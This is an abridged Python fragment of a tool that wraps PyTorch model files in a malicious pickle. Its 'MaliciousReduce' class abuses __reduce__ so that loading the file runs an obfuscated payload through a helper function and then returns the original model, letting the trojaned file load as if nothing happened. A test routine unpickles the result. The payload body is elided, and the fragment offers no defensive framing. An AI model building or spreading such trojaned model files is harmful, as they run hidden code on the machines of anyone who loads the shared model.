...
# Properly executes the obfuscated payload by using a separate namespace (exec_globals) to capture defined functions
# Global function that will be called during unpickling
def execute_payload_during_unpickle(payload_code, original_data):
    """Execute payload and return original data"""
    ...
    # Return the original data to be unpickled
...
class SimplePyTorchModelWrapper:
    ...
    def _create_malicious_pickle(self, original_data, payload_code):
        ...
        # Use __reduce__ with a global function for reliable execution
        class MaliciousReduce:
            def __reduce__(self):
                return (execute_payload_during_unpickle, (payload_code, original_data))

        # This will execute the payload and then return the original data when unpickled
...
def test_model_loading(model_path):
    ...
    try:
        ...
        if hasattr(loaded, 'eval'):
            ...
            # If it's bytes, try to unpickle it to get the original model
            if isinstance(loaded, bytes):
                try:
                    original = pickle.loads(loaded)
                    if hasattr(original, 'eval'):
                        original.eval()
                        print("✅ Successfully extracted original model from bytes")
                        loaded = original
                except:
                    pass
